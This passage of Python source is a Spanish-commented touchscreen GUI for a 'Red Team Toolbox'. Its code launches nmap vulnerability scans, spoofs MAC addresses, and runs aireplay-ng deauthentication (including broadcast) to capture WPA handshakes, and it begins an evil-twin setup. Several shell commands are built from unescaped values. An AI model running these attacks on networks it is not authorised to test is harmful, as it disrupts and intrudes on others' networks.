        self._console_drag_start_y = event.y

    def _on_console_touch_drag(self, event):
        """Calcula el movimiento y desplaza las líneas de la terminal."""
        # Solo procesamos si el evento y la variable existen
        if hasattr(self, '_console_drag_start_y'):
            dy = self._console_drag_start_y - event.y
            # Sensibilidad del arrastre (si se mueve más de 3 píxeles)
            if abs(dy) > 3:
                # Determina la dirección (1 hacia abajo, -1 hacia arriba)
                fraction = 1 if dy > 0 else -1
                self.console_textbox.yview_scroll(fraction, "units")
                self._console_drag_start_y = event.y

    def escribir_consola(self, texto):
        self.console_buffer.append(texto)
        if not self.console_pending:
            self.console_pending = True
            self._console_after_id = self.after(500, self._flush_console)

    def _flush_console(self):
        self.console_pending = False
        self._console_after_id = None
        if not hasattr(self, 'console_textbox') or not self.console_textbox.winfo_exists() or not self.console_textbox.winfo_ismapped():
            return
        lines = "\n".join(self.console_buffer) + "\n"
        self.console_buffer.clear()
        try:
            self.console_textbox.configure(state='normal')
            self.console_textbox.insert('end', lines)
            self.console_textbox.see('end')
            self.console_textbox.configure(state='disabled')
        except Exception:
            pass

    def obtener_interfaces_red(self):
        try:
            return sorted([i for i in os.listdir('/sys/class/net/') if i != "lo"])
        except Exception:
            return ["wlan0", "eth0"]

    # ---------------- Validación IP ----------------
    def validar_ip_cidr(self):
        ip = self.target_ip.get().strip()
        if self.usar_rango.get():
            cidr = self.rango_cidr.get().strip()
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            patron_cidr = r'^/(8|16|24|32)$'
            if not re.match(patron_ip, ip) or not re.match(patron_cidr, cidr):
                self.escribir_consola("[!] IP/CIDR inválido.")
                return False
        else:
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            if not re.match(patron_ip, ip):
                self.escribir_consola("[!] IP inválida.")
                return False
        return True

    def obtener_target(self):
        if not self.validar_ip_cidr():
            return None
        if self.usar_rango.get():
            return f"{self.target_ip.get()}{self.rango_cidr.get()}"
        return self.target_ip.get()

    # ---------------- Ejecución segura de comandos ----------------
    def ejecutar_comando(self, comando, callback_after=None, use_shell=True):
        if use_shell and isinstance(comando, str):
            self.escribir_consola(f"\nroot@kali:~# {comando}")
        else:
            self.escribir_consola(f"\nroot@kali:~# {' '.join(comando)}")

        def run():
            try:
                if use_shell:
                    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                else:
                    proc = subprocess.Popen(comando, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    self.escribir_consola(line.rstrip())
                proc.wait()
                self.escribir_consola("\n[+] Tarea finalizada.")
                if callback_after:
                    self.after(0, callback_after)
            except Exception as e:
                self.escribir_consola(f"\n[!] ERROR: {e}")
        threading.Thread(target=run, daemon=True).start()




    # ==========================================
    # PANTALLA DE CARGA (SPLASH SCREEN)
    # ==========================================
    def mostrar_splash_screen(self):
        self.limpiar_main_frame()
        
        # Frame del splash
        self.splash_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        self.splash_frame.pack(fill='both', expand=True)

        # Configuramos fuente muy pequeña y wrap='none' para que no rompa el diseño en 320x240
        self.splash_text = tk.Text(self.splash_frame, bg=COLOR_FONDO_PRINCIPAL, fg=COLOR_TEXTO_TERMINAL,
                                   font=('Courier', 2), relief='flat', highlightthickness=0, wrap='none')
        self.splash_text.pack(fill='both', expand=True, padx=2, pady=2)

        # Variables de control para la animación
        self.ruido_chars = ["░", "▒", "▓", "█", "#", "@", "%", "*"]
        self.frames_totales = 18  # Duración de la animación
        self.frame_actual = 0

        self._animar_splash()

    def _animar_splash(self):
        if self.frame_actual > self.frames_totales:
            # Termina la animación, pausa corta de 1 segundo y carga el menú
            self.after(1000, self.show_inicio_menu)
            return

        # Nivel de ruido va de 1.0 (máximo ruido) a 0.0 (nítido)
        nivel_ruido = 1.0 - (self.frame_actual / self.frames_totales)
        texto_borroso = ""

        # Generador de fotogramas
        for char in ARTE_DRAGON:
            if char not in (" ", "\n"):
                if random.random() < nivel_ruido:
                    texto_borroso += random.choice(self.ruido_chars)
                else:
                    texto_borroso += char
            else:
                texto_borroso += char

        # Actualizar la pantalla de manera segura
        self.splash_text.config(state='normal')
        self.splash_text.delete('1.0', tk.END)
        self.splash_text.insert(tk.END, texto_borroso)
        
        # Centramos el contenido dentro del text widget
        self.splash_text.tag_add("center", "1.0", "end")
        self.splash_text.tag_configure("center", justify="center")
        
        self.splash_text.config(state='disabled')

        self.frame_actual += 1
        # 100 milisegundos de delay por cada iteración
        self.after(100, self._animar_splash)    

    # ---------------- INICIO ----------------
    def show_inicio_menu(self):
        self.limpiar_main_frame()
        
        # Títulos de cabecera stándar
        ttk.Label(self.main_frame, text="DRAGON FLY SYSTEM", style='Title.TLabel').pack(pady=(8, 2))
        ttk.Label(self.main_frame, text="Red Team Toolbox", style='Gray.TLabel').pack(pady=(0, 6))

        # Inicializar el diccionario de caché en la instancia global si no existe
        if not hasattr(self, 'icon_cache'):
            self.icon_cache = {}

        # 1. DETECCIÓN DINÁMICA DE RESOLUCIÓN (Responsivo)
        # Intentar obtener el ancho actual de la interfaz; si aún no se mapea, recurre al ancho de pantalla global
        ancho_actual = self.winfo_width()
        if ancho_actual <= 1:
            ancho_actual = self.winfo_screenwidth()

        # Ajustar la distribución de la cuadrícula según el espacio en píxeles de la pantalla
        if ancho_actual <= 320:         # Pantallas pequeñas de 2.4" (Resolución 320x240)
            columnas = 2
            tamano_icono = (44, 44)
            padding_celda = 6
        elif ancho_actual <= 480:       # Pantallas medianas de 3.5" (Resolución 480x320)
            columnas = 3
            tamano_icono = (54, 54)
            padding_celda = 10
        else:                           # Monitores o ventanas de escritorio grandes
            columnas = 4
            tamano_icono = (72, 72)
            padding_celda = 16

        # Envolver la vista en el ScrollableFrame para habilitar el desplazamiento si hay desbordamiento vertical
        scroll_menu = ScrollableFrame(self.main_frame, max_items=15)
        scroll_menu.pack(fill='both', expand=True, padx=2, pady=2)

        # Marco de cuadrícula principal dentro del scroll frame
        grid_frame = ttk.Frame(scroll_menu.scrollable_frame, style='Dark.TFrame')
        grid_frame.pack(fill='both', expand=True, padx=4, pady=4)

        # Mapeo de opciones del sistema con sus respectivas rutas de iconos
        opciones = [
            ("Recon", self.show_recon_menu, "icons/recon.png"),
            ("MAC Changer", self.show_mac_menu, "icons/mac.png"),
            ("Auditoría WiFi", self.show_wifi_menu, "icons/wifi.png"),
            ("NRF24 Jammer", self.show_nrf_jammer_menu, "icons/jammer.png"),
            ("Rubber Ducky", self.show_ducky_menu, "icons/ducky.png"),
            ("PoisonTap", self.show_poison_menu, "icons/poison.png"),
            ("Utilidades OS", self.show_utils_menu, "icons/utils.png"),
            ("Autodestrucción", self.show_self_destruct_menu, "icons/destroy.png")
        ]

        # Evita que el Garbage Collector destruya las referencias de imagen del renderizado actual
        self.current_icon_refs = []

        for index, (texto, comando, icono_ruta) in enumerate(opciones):
            fila = index // columnas
            columna = index % columnas

            # Crear una clave única para la caché basada en la ruta y el tamaño calculado
            cache_key = (icono_ruta, tamano_icono)

            if cache_key in self.icon_cache:
                # Carga instantánea desde la memoria RAM
                photo = self.icon_cache[cache_key]
            else:
                try:
                    from PIL import Image, ImageTk
                    img = Image.open(icono_ruta).resize(tamano_icono, Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.icon_cache[cache_key] = photo  # Almacenar en caché para el próximo retorno
                except Exception:
                    # Mecanismo de respaldo (Fallback) en caso de ausencia de archivo o fallo de carga
                    from PIL import Image, ImageTk
                    img = Image.new('RGBA', tamano_icono, (0, 0, 0, 0))
                    photo = ImageTk.PhotoImage(img)
                    self.icon_cache[cache_key] = photo

            self.current_icon_refs.append(photo)

            # Control de espaciado: Un salto de línea '\n' al inicio del texto del botón empuja
            # limpiamente el título hacia abajo del icono, cumpliendo con la separación vertical exacta
            texto_con_espacio = f"\n{texto}"

            # Construcción del botón integrado (Icono arriba, Texto abajo)
            btn = ttk.Button(grid_frame, text=texto_con_espacio, image=photo, compound="top",
                             style='AppIcon.TButton', command=comando)
            
            # El parámetro sticky="nsew" asegura que el botón se expanda para rellenar toda la celda táctil
            btn.grid(row=fila, column=columna, padx=padding_celda, pady=padding_celda, sticky="nsew")

            # Configuración de pesos para garantizar la elasticidad proporcional de las filas y columnas
            grid_frame.grid_columnconfigure(columna, weight=1)
            grid_frame.grid_rowconfigure(fila, weight=1)

    # ==========================================
    # MENÚ RECONOCIMIENTO (NMAP) 
    # ==========================================
    def show_recon_menu(self):
        self.session_dir_nmap = ""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="RECONOCIMIENTO (NMAP)", style='Title.TLabel').pack(pady=(2,1))

        # Todo el contenido de Reconocimiento irá en este único ScrollableFrame
        scroll_cmds = ScrollableFrame(self.main_frame, max_items=20)
        scroll_cmds.pack(fill='both', expand=True, padx=2, pady=2)

        # Configuración de target dentro del scrollable frame
        config_frame = ttk.Frame(scroll_cmds.scrollable_frame, style='Dark.TFrame')
        config_frame.pack(fill='x', padx=2, pady=1)

        ttk.Label(config_frame, text="IP:", style='Dark.TLabel').grid(row=0, column=0, padx=1, pady=1)
        entry_target = ttk.Entry(config_frame, textvariable=self.target_ip, width=16, style='Dark.TEntry')
        entry_target.grid(row=0, column=1, padx=1, pady=1)
        entry_target.bind("<Button-1>", lambda e: TecladoNumerico(self, self.target_ip))

        ttk.Button(config_frame, text="Set", style='Red.TButton', width=6,
                   command=lambda: self.escribir_consola(f"[+] Target: {self.obtener_target() or 'Inválido'}")).grid(row=0, column=2, padx=1, pady=1)

        chk_rango = ttk.Checkbutton(config_frame, text="Usar rango", variable=self.usar_rango, style='Dark.TCheckbutton')
        chk_rango.grid(row=1, column=0, columnspan=2, sticky="w", padx=1, pady=1)

        rango_menu = ttk.OptionMenu(config_frame, self.rango_cidr, self.rango_cidr.get(), "/24", "/16", "/8", style='Dark.TMenubutton')
        rango_menu.grid(row=1, column=2, padx=1, pady=1)

        # Lista única y completa de comandos Nmap
        comandos_nmap = [
            ("0. Descubrimiento", "-sn {TARGET} -oN {SESSION}/00_hosts.txt"),
            ("1. Puertos comunes", "-sS -T3 --top-ports 1000 {TARGET} -oN {SESSION}/01_common.txt"),
            ("2. Full TCP", "-sS -p- -T3 {TARGET} -oN {SESSION}/02_full_tcp.txt"),
            ("3. Servicios/vers.", "-sV --version-intensity 5 {TARGET} -oN {SESSION}/03_services.txt"),
            ("4. Detección OS", "-O --osscan-guess {TARGET} -oN {SESSION}/04_os.txt"),
            ("5. UDP comunes", "-sU --top-ports 100 -T3 {TARGET} -oN {SESSION}/05_udp.txt"),
            ("6. Vulnerabilidades", "--script vuln,exploit {TARGET} -oN {SESSION}/06_vuln.txt"),
            ("7. Agresivo", "-A -p- -T3 {TARGET} -oN {SESSION}/07_aggressive.txt"),
            ("8. Firewall/IDS", "-sA -p 80,443,22,21,25 {TARGET} -oN {SESSION}/08_firewall.txt"),
            ("9. Scripts servicios", "--script http-enum,ssh-auth-methods,smb-enum-shares,ftp-anon {TARGET} -oN {SESSION}/09_scripts.txt"),
            ("10. SSL/TLS", "--script ssl-enum-ciphers,ssl-cert -p 443,8443 {TARGET} -oN {SESSION}/10_ssl.txt"),
            ("11. Traceroute", "--traceroute {TARGET} -oN {SESSION}/11_traceroute.txt"),
            ("12. Automatizado", f"-sn {{TARGET}} -oN {{SESSION}}/12a_discovery.txt && nmap -sS -p- -T3 {{TARGET}} -oN {{SESSION}}/12b_ports.txt && nmap -sV -sC {{TARGET}} -oN {{SESSION}}/12c_services.txt")
        ]

        # --- NUEVA LÓGICA: Lista para almacenar las referencias de los botones ---
        self.nmap_botones_lista = []

        for nombre, cmd in comandos_nmap:
            btn = scroll_cmds.add_button(text=nombre, command=lambda c=cmd: self._ejecutar_nmap(c),
                                         style='Red.TButton', width=28)
            if btn:
                self.nmap_botones_lista.append(btn)

        # --- NUEVO BOTÓN: Detener Escaneo (Añadido antes de "Ver Resultados") ---
        self.btn_detener_nmap = ttk.Button(scroll_cmds.scrollable_frame, text="Detener Escaneo", style='Gray.TButton',
                                           command=self._detener_nmap)
        self.btn_detener_nmap.pack(pady=(15, 3), fill='x', padx=20)
        self.btn_detener_nmap.state(['disabled']) # Inicia bloqueado

        # Botón explorar y consola inyectados al final del frame deslizable
        ttk.Button(scroll_cmds.scrollable_frame, text="Ver Resultados", style='Gray.TButton',
                   command=self._mostrar_explorador_nmap).pack(pady=3, fill='x', padx=20)
        
        self.mostrar_consola(parent=scroll_cmds.scrollable_frame)
        gc.collect()

    def _ejecutar_nmap(self, cmd_template):
        target = self.obtener_target()
        if target is None:
            self.escribir_consola("[!] Target inválido.")
            return

        # 1. Bloquear todos los botones de escaneo y cambiarlos a color gris para feedback visual
        for btn in self.nmap_botones_lista:
            btn.config(style='Gray.TButton')
            btn.state(['disabled'])
        
        # 2. Habilitar el botón de detener (color de peligro)
        self.btn_detener_nmap.config(style='Danger.TButton')
        self.btn_detener_nmap.state(['!disabled'])

        if not self.session_dir_nmap:
            timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            self.session_dir_nmap = os.path.join(BASE_DIR_NMAP, f"Auditoria-{timestamp}")
        os.makedirs(self.session_dir_nmap, exist_ok=True)
        
        comando = cmd_template.replace("{TARGET}", target).replace("{SESSION}", self.session_dir_nmap)

        # 3. Callback dinámico: Se ejecuta cuando termina el escaneo (o se detiene a la fuerza)
        def on_finish():
            # winfo_exists() evita crasheos si el usuario cambió de menú mientras escaneaba
            for btn in self.nmap_botones_lista:
                if btn.winfo_exists():
                    btn.config(style='Red.TButton')
                    btn.state(['!disabled'])
            
            if hasattr(self, 'btn_detener_nmap') and self.btn_detener_nmap.winfo_exists():
                self.btn_detener_nmap.config(style='Gray.TButton')
                self.btn_detener_nmap.state(['disabled'])

        self.ejecutar_comando(f"nmap {comando}", callback_after=on_finish)

    def _detener_nmap(self):
        self.escribir_consola("\n[!] Deteniendo proceso Nmap en curso...")
        # Matamos el proceso subyacente. Esto hará que self.ejecutar_comando() reciba 
        # la señal de fin, lance el "on_finish" y la UI se desbloquee automáticamente.
        subprocess.run(["sudo", "pkill", "nmap"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _mostrar_explorador_nmap(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_recon_menu)
        ttk.Label(self.main_frame, text="RESULTADOS NMAP", style='Title.TLabel').pack(pady=2)

        if not os.path.exists(BASE_DIR_NMAP):
            os.makedirs(BASE_DIR_NMAP)
        carpetas = sorted([d for d in os.listdir(BASE_DIR_NMAP) if os.path.isdir(os.path.join(BASE_DIR_NMAP, d))], reverse=True)
        if not carpetas:
            ttk.Label(self.main_frame, text="No hay registros.", style='Dark.TLabel').pack(pady=10)
            return

        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for carpeta in carpetas:
            ruta = os.path.join(BASE_DIR_NMAP, carpeta)
            scroll.add_button(text=carpeta, command=lambda r=ruta: self._mostrar_archivos_nmap(r),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _mostrar_archivos_nmap(self, ruta):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._mostrar_explorador_nmap)
        nombre = os.path.basename(ruta)
        ttk.Label(self.main_frame, text=nombre, style='Title.TLabel').pack(pady=2)

        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        if not archivos:
            ttk.Label(self.main_frame, text="Carpeta vacía", style='Dark.TLabel').pack(pady=10)
            return

        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for archivo in archivos:
            arch_path = os.path.join(ruta, archivo)
            scroll.add_button(text=archivo,
                              command=lambda ap=arch_path: self.ejecutar_comando(f"cat '{ap}'"),
                              style='Gray.TButton', width=28)
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    # ==========================================
    # MENÚ MAC CHANGER 
    # ==========================================
    def show_mac_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="DIRECCION MAC", style='Title.TLabel').pack(pady=2)
        
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ttk.Label(self.main_frame, text="No hay interfaces.", style='Dark.TLabel').pack()
            return
            
        scroll_mac = ScrollableFrame(self.main_frame, max_items=10)
        scroll_mac.pack(fill='both', expand=True, padx=2, pady=2)
            
        self.interfaz_seleccionada.set(interfaces[0])
        sel_frame = ttk.Frame(scroll_mac.scrollable_frame, style='Dark.TFrame')
        sel_frame.pack(pady=3)
        ttk.Label(sel_frame, text="Iface: ", style='Dark.TLabel').pack(side='left')

        ttk.OptionMenu(sel_frame, self.interfaz_seleccionada, self.interfaz_seleccionada.get(),
                    *interfaces, style='Dark.TMenubutton').pack(side='left')
                    
        # Generadores de comandos dinámicos (capturan la interfaz en tiempo real)
        botones = [
            ("Ver Estado",        lambda: f"sudo macchanger -s {self.interfaz_seleccionada.get()}"),
            ("MAC Random",        lambda: f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -r {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
            ("Reset Original",    lambda: f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -p {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
            ("Mismo Fabricante",  lambda: f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -a {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
        ]
        
        for texto, cmd_gen in botones:
            # Se usa un argumento por defecto para evitar el cierre tardío (late binding)
            scroll_mac.add_button(text=texto, command=lambda gen=cmd_gen: self.ejecutar_comando(gen()),
                                style='Red.TButton', width=28)

        self.mostrar_consola(parent=scroll_mac.scrollable_frame)

    # ==========================================
    # MENÚ WIFI 
    # ==========================================
    def show_wifi_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="AUDITORÍA WIFI", style='Title.TLabel').pack(pady=2)
        
        scroll_wifi = ScrollableFrame(self.main_frame, max_items=10)
        scroll_wifi.pack(fill='both', expand=True, padx=2, pady=2)
        
        opciones = [
            ("Activar Monitor", self._wifi_modo_monitor),
            ("Captura Handshake", self._wifi_captura_handshake),
            ("Ataque Evil Twin", self._wifi_evil_twin),
            ("Desautenticación", self._wifi_deauth),
            ("Explorar Handshakes", self._wifi_explorar_handshakes),
            ("Explorar Evil Twin", self._wifi_explorar_evil),
        ]
        for texto, cmd in opciones:
            scroll_wifi.add_button(text=texto, command=cmd, style='Red.TButton', width=28)
            
        self.mostrar_consola(parent=scroll_wifi.scrollable_frame)

    def _wifi_modo_monitor(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="MODO MONITOR", style='Title.TLabel').pack(pady=2)
        interfaces = self.obtener_interfaces_red()
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        if not interfaces:
            ttk.Label(scroll.scrollable_frame, text="No hay interfaces.", style='Dark.TLabel').pack()
            return
            
        for iface in interfaces:
            def comando_iface(i=iface):
                subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["sudo", "airmon-ng", "start", i],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.ejecutar_comando(f"sudo airmon-ng start {i}",
                                     callback_after=lambda: self.escribir_consola("[+] Hecho."))
            scroll.add_button(text=f"Start {iface}", command=comando_iface, style='Red.TButton', width=28)
            
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _generar_nombre_temporal(self, prefijo):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        return f"/tmp/{prefijo}_{timestamp}"

    def _wifi_captura_handshake(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="CAPTURAR: Elija IFace", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        self.handshake_iface_btns = []
        interfaces = self.obtener_interfaces_red()
        for iface in interfaces:
            btn = scroll.add_button(text=iface, command=lambda i=iface: self._wifi_escanear_redes_handshake(i), 
                              style='Red.TButton', width=28)
            if btn:
                self.handshake_iface_btns.append(btn)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _wifi_escanear_redes_handshake(self, iface):
        # Bloquear los botones de las otras interfaces al hacer clic
        for btn in getattr(self, 'handshake_iface_btns', []):
            if btn and btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])

        self.wifi_state = {"iface": iface, "mon_iface": None}
        self.escribir_consola(f"[*] Modo monitor en {iface}...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.wifi_state["mon_iface"] = mon
        scan_prefix = self._generar_nombre_temporal("wifi_handshake")
        self.wifi_state["scan_file"] = scan_prefix

        def escanear():
            subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            redes = []
            try:
                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
                                         "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
            except: pass
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try: os.remove(f"{scan_prefix}{ext}")
                    except: pass
            self.after(0, lambda: self._wifi_mostrar_redes_handshake(redes))
        threading.Thread(target=escanear, daemon=True).start()
        self.escribir_consola("[*] Escaneando 15s...")

    def _wifi_mostrar_redes_handshake(self, redes):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_captura_handshake)
        ttk.Label(self.main_frame, text="SELECCIONA RED", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        for red in redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            scroll.add_button(text=texto, style='Gray.TButton', width=28,
                              command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r))
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _wifi_seleccionar_cliente_handshake(self, red):
        self.wifi_state["target"] = red
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("wifi_clients")
        subprocess.run(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]: clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try: os.remove(f"{scan_prefix}{ext}")
                except: pass

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
        ttk.Label(self.main_frame, text="CLIENTES", style='Title.TLabel').pack(pady=2)
        scroll = ScrollableFrame(self.main_frame, max_items=50)
        scroll.pack(fill='both', expand=True, padx=5, pady=2)
        
        self.handshake_client_btns = []
        
        # Botón para Finalizar y Restaurar Red
        btn_fin = scroll.add_button(text="FINALIZAR AUDITORÍA", style='Danger.TButton', width=28,
                          command=self._wifi_finalizar_handshake)
        if btn_fin: self.handshake_client_btns.append(btn_fin)

        btn_broad = scroll.add_button(text="Todos (Broadcast)", style='Danger.TButton', width=28,
                          command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF"))
        if btn_broad: self.handshake_client_btns.append(btn_broad)
        
        for mac in clientes:
            btn = scroll.add_button(text=mac, style='Gray.TButton', width=28,
                              command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m))
            if btn: self.handshake_client_btns.append(btn)
            
        self.mostrar_consola(parent=scroll.scrollable_frame)
        gc.collect()

    def _wifi_finalizar_handshake(self):
        # Bloquear los botones para evitar duplicados en la UI
        for btn in getattr(self, 'handshake_client_btns', []):
            if btn and btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])
        
        self.escribir_consola("[*] Finalizando auditoría y restaurando red...")
        def restore():
            mon = self.wifi_state.get("mon_iface")
            if mon:
                subprocess.run(["sudo", "airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            # Regresar al menú principal de WiFi
            self.after(0, self.show_wifi_menu)
            
        threading.Thread(target=restore, daemon=True).start()
    def _wifi_iniciar_ataque_handshake(self, cliente_mac):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.join(BASE_DIR_WIFI, f"Auditoria-{timestamp}")
        os.makedirs(session_dir, exist_ok=True)
        subprocess.Popen(["sudo", "airodump-ng", "--channel", red['ch'], "--bssid", red['bssid'],
                         "-w", f"{session_dir}/Captura", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        cmd_deauth = f"sudo aireplay-ng -0 10 -a {red['bssid']} -c {cliente_mac} {mon}"
        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Salvado: {session_dir}"))
        self.escribir_consola("[*] Esperando handshake...")


    # ==========================================
    # EVIL TWIN 
    # ==========================================
    def _wifi_evil_twin(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="EVIL TWIN - IFace AP", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        interfaces = self.obtener_interfaces_red()
        if len(interfaces) < 2:
            ttk.Label(scroll.scrollable_frame, text="Requiere 2 interfaces.", style='Dark.TLabel').pack()
            return
            
        self.evil_ap_btns = []
        for iface in interfaces:
            btn = scroll.add_button(text=f"AP: {iface}", command=lambda i=iface: self._evil_twin_select_deauth(i),
                              style='Red.TButton', width=28)
            if btn: self.evil_ap_btns.append(btn)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _evil_twin_select_deauth(self, ap_iface):
        # Bloquear botones del menú de AP
        for btn in getattr(self, 'evil_ap_btns', []):
            if btn and btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])

        self.wifi_state["ap_iface"] = ap_iface
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ttk.Label(self.main_frame, text="IFace Deauth", style='Title.TLabel').pack(pady=2)
        
        scroll = ScrollableFrame(self.main_frame, max_items=10)
        scroll.pack(fill='both', expand=True, padx=2, pady=2)
        
        self.evil_deauth_btns = []
        for iface in [i for i in self.obtener_interfaces_red() if i != ap_iface]:
            btn = scroll.add_button(text=iface, command=lambda i=iface: self._evil_twin_escanear_redes(i),
                              style='Red.TButton', width=28)
            if btn: self.evil_deauth_btns.append(btn)
                              
        self.mostrar_consola(parent=scroll.scrollable_frame)

    def _evil_twin_escanear_redes(self, deauth_iface):
        # Bloquear botones de interfaces deauth
        for btn in getattr(self, 'evil_deauth_btns', []):
            if btn and btn.winfo_exists():
                btn.config(style='Gray.TButton')
                btn.state(['disabled'])

        self.wifi_state["deauth_iface"] = deauth_iface
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # ... El resto de este método queda igual (continúa con mon_deauth y scan_prefix)...
        mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
        self.wifi_state["mon_deauth"] = mon

        scan_prefix = self._generar_nombre_temporal("evil_scan")
        self.wifi_state["scan_file"] = scan_prefix

        def escanear():
            subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            redes = []
            try:
